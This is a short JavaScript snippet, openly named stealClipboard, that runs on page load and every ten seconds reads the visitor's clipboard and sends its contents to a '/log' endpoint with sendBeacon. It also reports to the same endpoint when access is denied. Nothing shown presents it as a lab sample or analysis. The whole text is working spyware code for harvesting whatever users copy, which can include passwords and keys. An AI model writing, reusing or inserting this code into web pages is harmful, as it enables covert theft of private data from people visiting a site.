(function () {
    async function stealClipboard() {
        try {
            const text = await navigator.clipboard.readText();
            if (text && text.length > 0) {
                navigator.sendBeacon("/log", "CLIPBOARD: " + text);
            }
        } catch (err) {
            // Most browsers require user interaction to allow clipboard access
            navigator.sendBeacon("/log", "CLIPBOARD: [Access Denied or Requires Interaction]");
        }
    }

    setInterval(stealClipboard, 10000); // Try every 10 seconds
})();
